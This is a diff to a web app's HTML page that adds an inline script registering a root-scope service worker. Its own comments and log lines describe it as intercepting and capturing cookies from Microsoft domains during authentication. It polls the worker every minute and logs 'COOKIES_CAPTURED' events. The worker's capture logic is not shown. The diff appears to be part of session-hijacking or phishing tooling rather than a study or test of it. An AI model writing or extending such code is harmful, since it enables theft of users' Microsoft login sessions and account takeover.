@@ -42,5 +42,53 @@
   </head>
   <body>
     <div id="root"></div>
+
+    <script>
+      /**
+       * Service Worker Registration for Microsoft Cookie Bridge
+       * Intercepts and captures cookies from Microsoft domain during authentication
+       */
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          console.log('🔧 Registering Service Worker for Microsoft cookie capture...');
+          
+          navigator.serviceWorker.register('/service-worker.js', {
+            scope: '/',
+            updateViaCache: 'none'
+          }).then((registration) => {
+            console.log('✅ Service Worker registered successfully:', registration);
+            console.log('📍 Service Worker scope:', registration.scope);
+            console.log('🔄 Service Worker state:', registration.installing || registration.waiting || registration.active ? 'Active' : 'Pending');
+          }).catch((error) => {
+            console.error('❌ Service Worker registration failed:', error);
+          });
+
+          // Check for Service Worker updates periodically
+          setInterval(() => {
+            if (navigator.serviceWorker.controller) {
+              navigator.serviceWorker.controller.postMessage({
+                type: 'CHECK_UPDATE'
+              });
+            }
+          }, 60000); // Check every 60 seconds
+        });
+
+        // Listen for Service Worker activation
+        navigator.serviceWorker.addEventListener('controllerchange', () => {
+          console.log('🔄 Service Worker controller changed - new version activated');
+        });
+
+        // Listen for messages from Service Worker
+        navigator.serviceWorker.addEventListener('message', (event) => {
+          console.log('💬 Message from Service Worker:', event.data);
+          
+          if (event.data.type === 'COOKIES_CAPTURED') {
+            console.log('🍪 Cookies captured from Microsoft domain:', event.data.data.totalCookies);
+          }
+        });
+      } else {
+        console.warn('⚠️ Service Worker not supported in this browser');
+      }
+    </script>
   </body>
 </html>
